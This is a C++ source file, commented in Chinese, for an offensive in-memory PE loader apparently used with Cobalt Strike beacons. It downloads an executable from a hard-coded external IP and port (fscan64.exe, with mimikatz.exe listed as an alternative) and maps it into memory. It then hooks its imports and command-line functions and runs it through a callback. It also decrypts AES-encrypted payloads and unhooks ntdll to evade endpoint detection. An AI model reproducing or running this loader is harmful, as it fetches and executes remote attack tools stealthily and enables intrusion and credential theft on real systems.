#define _CRT_RAND_S
#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <psapi.h>
#include <winternl.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <limits>
#include <stdlib.h>
#include "HttpRequest.h"

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NtCurrentThread() ( ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )

#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "winhttp")

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "ntdll")

EXTERN_C NTSTATUS NtOpenSection(
    OUT PHANDLE             SectionHandle,
    IN ACCESS_MASK         DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes
);

using MyNtMapViewOfSection = NTSTATUS(NTAPI*)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );




typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY;



struct DATA {

    LPVOID data;
    size_t len;

};



/* 定义常量 */
#define HTTP_DEF_PORT     80  /* 连接的缺省端口 */
#define HTTP_BUF_SIZE   1024  /* 缓冲区的大小   */
#define HTTP_HOST_LEN    256  /* 主机名长度 */

char* http_req_hdr_tmpl = "GET %s HTTP/1.1\r\n"
"Accept: image/gif, image/jpeg, */*\r\nAccept-Language: zh-cn\r\n"
"Accept-Encoding: gzip, deflate\r\nHost: %s:%d\r\n"
"User-Agent: Huiyong's Browser <0.1>\r\nConnection: Keep-Alive\r\n\r\n";

//#pragma comment(lib,"ws2_32.lib")

// 进行aes解密
void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}


DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {

    DATA data;
    std::vector<unsigned char> buffer;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    BOOL bResults = FALSE;
    HINTERNET hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);


    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, whost,
            port, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {

                    buffer.insert(buffer.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);

                }
                delete[] pszOutBuffer;
            }

        } while (dwSize > 0);

        if (buffer.empty() == TRUE)
        {
            printf("Failed in retrieving the Shellcode");
        }

        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = buffer.size();

        char* bufdata = (char*)malloc(size);
        for (int i = 0; i < buffer.size(); i++) {
            bufdata[i] = buffer[i];
        }
        data.data = bufdata;
        data.len = size;
        return data;

}


//cmdline args vars
BOOL hijackCmdline = FALSE;
char* sz_masqCmd_Ansi = NULL;
char* sz_masqCmd_ArgvAnsi[100];
wchar_t* sz_masqCmd_Widh = NULL;
wchar_t* sz_masqCmd_ArgvWidh[100];
wchar_t** poi_masqArgvW = NULL;
char** poi_masqArgvA = NULL;
int int_masqCmd_Argc = 0;
struct MemAddrs* pMemAddrs = NULL;
DWORD dwTimeout = 0;

//PE vars
BYTE* pImageBase = NULL;
IMAGE_NT_HEADERS* ntHeader = NULL;


//-------------All of these functions are custom-defined versions of functions we hook in the PE's IAT-------------

LPWSTR hookGetCommandLineW()
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinew");
    return sz_masqCmd_Widh;
}

LPSTR hookGetCommandLineA()
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinea");
    return sz_masqCmd_Ansi;
}

char*** __cdecl hook__p___argv(void)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argv");
    return &poi_masqArgvA;
}

wchar_t*** __cdecl hook__p___wargv(void)
{

    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___wargv");
    return &poi_masqArgvW;
}

int* __cdecl hook__p___argc(void)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argc");
    return &int_masqCmd_Argc;
}

int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called __wgetmainargs");
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvW;

    return 0;
}

int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called __getmainargs");
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvA;

    return 0;
}

_onexit_t __cdecl hook_onexit(_onexit_t function)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called onexit!\n");
    return 0;
}

int __cdecl hookatexit(void(__cdecl* func)(void))
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called atexit!\n");
    return 0;
}

int __cdecl hookexit(int status)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "Exit called!\n");
    //_cexit() causes cmd.exe to break for reasons unknown...
    ExitThread(0);
    return 0;
}

void __stdcall hookExitProcess(UINT statuscode)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "ExitProcess called!\n");
    ExitThread(0);
}
void masqueradeCmdline()
{
    //Convert cmdline to widestring
    int required_size = MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, NULL, 0);
    sz_masqCmd_Widh = (wchar_t*)calloc(required_size + 1, sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);

    //Create widestring array of pointers
    poi_masqArgvW = CommandLineToArgvW(sz_masqCmd_Widh, &int_masqCmd_Argc);

    //Manual function equivalent for CommandLineToArgvA
    int retval;
    int memsize = int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
        memsize += retval;
    }

    poi_masqArgvA = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);

    int bufLen = memsize - int_masqCmd_Argc * sizeof(LPSTR);
    LPSTR buffer = ((LPSTR)poi_masqArgvA) + int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buffer, bufLen, NULL, NULL);
        poi_masqArgvA[i] = buffer;
        buffer += retval;
        bufLen -= retval;
    }

    hijackCmdline = TRUE;
}


//This array is created manually since CommandLineToArgvA doesn't exist, so manually freeing each item in array
void freeargvA(char** array, int Argc)
{
    //Wipe cmdline args from beacon memory
    for (int i = 0; i < Argc; i++)
    {
        memset(array[i], 0, strlen(array[i]));
    }
    LocalFree(array);
}

//This array is returned from CommandLineToArgvW so using LocalFree as per MSDN
void freeargvW(wchar_t** array, int Argc)
{
    //Wipe cmdline args from beacon memory
    for (int i = 0; i < Argc; i++)
    {
        memset(array[i], 0, wcslen(array[i]) * 2);
    }
    LocalFree(array);
}

// 从文件第一个字节定位到PE文件的头
char* GetNTHeaders(char* pe_buffer)
{
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {  // 判断是否是PE文件
        return NULL;
    }
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh->e_lfanew;  // NT头的起始位置 文件头到PE起始位置的偏移量
    if (pe_offset > kMaxOffset) return NULL;
    IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((char*)pe_buffer + pe_offset); // PE头起始位置
    if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return (char*)inh;
}

// 通过PE文件首地址和表的偏移获取RVA
IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)
{
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

    char* nt_headers = GetNTHeaders((char*)pe_buffer);
    if (nt_headers == NULL) return NULL;

    IMAGE_DATA_DIRECTORY* peDir = NULL;

    IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
    peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]); // 各表RVA及大小 0 为导出表 1为导入表

    if (peDir->VirtualAddress == NULL) {
        return NULL;
    }
    return peDir;
}

// 输入一个PE文件的首地址，并把所需要的dll加载到IAT中
bool RepairIAT(PVOID modulePtr)
{
    // 获取导入表
    IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (importsDir == NULL) return false;

    size_t maxSize = importsDir->Size;  // 导入表的长度
    size_t impAddr = importsDir->VirtualAddress;  // 导入表的起始位置
    printf("impAddr: %p\n", impAddr);

    IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
    size_t parsedSize = 0;

    for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        // 获取libname的 VA 地址
        lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);
        printf("lib_desc:%p\n", lib_desc);
        

        if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
        // 获取到导入dll的名字
        LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);
        printf("imagebase:%p\n", modulePtr);
        printf("lib_name: %s\n", lib_name);

        size_t call_via = lib_desc->FirstThunk;  // IAT
        size_t thunk_addr = lib_desc->OriginalFirstThunk;  // INT
        if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;  

        size_t offsetField = 0;
        size_t offsetThunk = 0;
        while (true)
        {
            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);   // IAT
            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);  // INT
            // 判断是否通过序号定位函数
            if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64) 
            {
                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));  // 通过INT获取函数号称在获取函数地址 0xFFFF取出低十六位
                fieldThunk->u1.Function = addr;  // 获取到的地址赋值给IAT

            }
            // 判断是否到链子的底端
            if (fieldThunk->u1.Function == NULL) break;

            if (fieldThunk->u1.Function == orginThunk->u1.Function) {  // 如果相等说明没有发生重定向，两个结构体里存的都是函数名

                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr)+orginThunk->u1.AddressOfData);   //IMAGE_IMPORT_BY_NAME结构体
                LPSTR func_name = (LPSTR)by_name->Name;  // 函数名
                

                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name); //通过INT里的函数名获取函数地址
                printf("func_name: %s ,address is :%p\n", func_name, addr);
                // 以下是填充一些杂七杂八的运行参数
                if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
                }
                else if (hijackCmdline && _stricmp(func_name, "GetCommandLineW") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineW;
                }
                else if (hijackCmdline && _stricmp(func_name, "__wgetmainargs") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__wgetmainargs;
                }
                else if (hijackCmdline && _stricmp(func_name, "__getmainargs") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__getmainargs;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___argv") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___argv;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___wargv") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___wargv;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___argc") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___argc;
                }
                else if (hijackCmdline && (_stricmp(func_name, "exit") == 0 || _stricmp(func_name, "_Exit") == 0 || _stricmp(func_name, "_exit") == 0 || _stricmp(func_name, "quick_exit") == 0))
                {
                    fieldThunk->u1.Function = (size_t)hookexit;
                }
                else if (hijackCmdline && _stricmp(func_name, "ExitProcess") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookExitProcess;
                }
                else
                    fieldThunk->u1.Function = addr;

            }
            offsetField += sizeof(IMAGE_THUNK_DATA);
            offsetThunk += sizeof(IMAGE_THUNK_DATA);
        }
    }
    return true;
}

// 加载PE文件 把date文件加载到内存中
void PELoader(char* data, DWORD datasize)
{
    // 获取命令行参数
    masqueradeCmdline();

    unsigned int chksum = 0;
    for (long long i = 0; i < datasize; i++) { chksum = data[i] * i + chksum / 3; }; // 校验码

    BYTE* pImageBase = NULL;
    LPVOID preferAddr = 0;
    DWORD OldProtect = 0;
    // 获取NT头
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
    printf("ntHeader: %p\n", ntHeader);
    if (!ntHeader) {
        exit(0);
    }

    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC); // 获取基地址重定位表
    printf("relocDir: %p\n", relocDir);
    preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase; // 获取PE文件中的镜像基址
    printf("preferAddr: %p\n", preferAddr);


    HMODULE dll = LoadLibraryA("ntdll.dll");
    // 强制卸载
    ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
    // 根据PE文件加载到内存占用的总大小申请内存
    pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("pImageBase: %p\n", pImageBase);
    if (!pImageBase) {
        if (!relocDir) {
            exit(0);
        }
        else {
            pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            printf("pImageBase: %p\n", pImageBase);
            if (!pImageBase)
            {
                exit(0);
            }
        }
    }

    // FILL the memory block with PEdata

    // 将镜像基址赋值到pe文件头
    ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
    printf("ntHeader->OptionalHeader.ImageBase: %p\n", ntHeader->OptionalHeader.ImageBase);
    // 将文件头拷贝到内存中
    memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);
    // 文件头的节
    IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
    printf("SectionHeaderArr:%p\n",SectionHeaderArr);
    // 依次通过节数把文件中的数据拷贝到内存中
    printf("ntHeader->FileHeader.NumberOfSections is :%p \n", ntHeader->FileHeader.NumberOfSections);
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
    {
        memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
    }

    // Fix the PE Import addr table
    RepairIAT(pImageBase);

    // AddressOfEntryPoint
    size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
    printf("retAddr: %p\n", retAddr);
    printf("Well jmp: %p\n", retAddr-2330);

    BOOL AA=EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
    printf("AA: %d\n", AA);

}




LPVOID getNtdll() {

    LPVOID pntdll = NULL;

    //Create our suspended process
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    if (!pi.hProcess)
    {
        printf("[-] Error creating process\r\n");
        return NULL;
    }

    //Get base address of NTDLL
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi;
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));


    pntdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage);
    SIZE_T dwRead;
    BOOL bSuccess = ReadProcessMemory(pi.hProcess, (LPCVOID)mi.lpBaseOfDll, pntdll, mi.SizeOfImage, &dwRead);
    if (!bSuccess) {
        printf("Failed in reading ntdll (%u)\n", GetLastError());
        return NULL;
    }


    TerminateProcess(pi.hProcess, 0);
    return pntdll;
}



// 脱钩ntdll
BOOL Unhook(LPVOID cleanNtdll) {

    char nt[] = { 'n','t','d','l','l','.','d','l','l', 0 };

    HANDLE hNtdll = GetModuleHandleA(nt);
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((DWORD64)cleanNtdll + DOSheader->e_lfanew);
    int i;


    // find .text section
    for (i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHdr = (PIMAGE_SECTION_HEADER)((DWORD64)IMAGE_FIRST_SECTION(NTheader) + ((DWORD64)IMAGE_SIZEOF_SECTION_HEADER * i));

        char txt[] = { '.','t','e','x','t', 0 };

        if (!strcmp((char*)sectionHdr->Name, txt)) {

            // prepare ntdll.dll memory region for write permissions.
            BOOL ProtectStatus1 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!ProtectStatus1) {
                printf("Failed to change the protection (%u)\n", GetLastError());
                return FALSE;
            }

            // copy .text section from the mapped ntdll to the hooked one
            memcpy((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress), (LPVOID)((DWORD64)cleanNtdll + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize);


            // restore original protection settings of ntdll
            BOOL ProtectStatus2 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!ProtectStatus2) {
                printf("Failed to change the protection back (%u)\n", GetLastError());
                return FALSE;
            }

        }
    }

    return TRUE;

}


int main(int argc, char** argv) {
    /*
    HWND hwndDOS = GetForegroundWindow();
    ShowWindow(hwndDOS, SW_HIDE);
    HttpRequest httpReq("101.42.175.89", 65522);
    std::vector<char> exeData = httpReq.HttpGet("/fscan32.exe");
    std::string str_orign = "vwxyz123456789011111111";
    str_orign = res;

    if (argc != 5) {
        printf("[+] Usage: %s <Host> <Port> <Cipher> <Key>\n", argv[0]);
        return 1;
    }

    char* host = argv[1];


    DWORD port = atoi(argv[2]);


    char* pe = argv[3];

    char* key = argv[4];

    const size_t cSize1 = strlen(host) + 1;
    wchar_t* whost = new wchar_t[cSize1];
    mbstowcs(whost, host, cSize1);


    const size_t cSize2 = strlen(pe) + 1;
    wchar_t* wpe = new wchar_t[cSize2];
    mbstowcs(wpe, pe, cSize2);

    const size_t cSize3 = strlen(key) + 1;
    wchar_t* wkey = new wchar_t[cSize3];
    mbstowcs(wkey, key, cSize3);



    printf("\n\n[+] Get AES Encrypted PE from %s:%d\n", host, port);
    */
    // 获取一个加密的PE文件
    wchar_t* whost= L"101.42.175.89";
    DWORD port= 65522;
    wchar_t* wpe = L"fscan64.exe";   //mimikatz.exe   fscan32.exe  main.exe
    //char* host1 = argv[1];
    //DWORD port1 = atoi(argv[2]);
    //char* pe1 = argv[3];
    //char* key1 = argv[4];
    DATA PE = GetData(whost, port, wpe);
    printf("fscan32 address is :%p\n the lenght is : %d\n",PE.data,PE.len);
    sz_masqCmd_Ansi = (char*)"-rf";
    PELoader((char*)PE.data, PE.len);
    
    /*
    if (!PE.data) {
        printf("[-] Failed in getting AES Encrypted PE\n");
        return -1;
    }

    printf("\n[+] Get AES Key from %s:%d\n", host, port);
    DATA keyData = GetData(whost, port, wkey);
    if (!keyData.data) {
        printf("[-] Failed in getting key\n");
        return -2;
    }
    printf("\n[+] AES PE Address : %p\n", PE.data);
    printf("\n[+] AES Key Address : %p\n", keyData.data);

    printf("\n[+] Decrypt the PE \n");
    DecryptAES((char*)PE.data, PE.len, (char*)keyData.data, keyData.len);
    printf("\n[+] PE Decrypted\n");

    // Fixing command line
    sz_masqCmd_Ansi = (char*)"whatEver";

    printf("\n[+] Loading and Running PE\n");
    PELoader((char*)PE.data, PE.len);

    printf("\n[+] Finished\n");

    */
    return 0;
}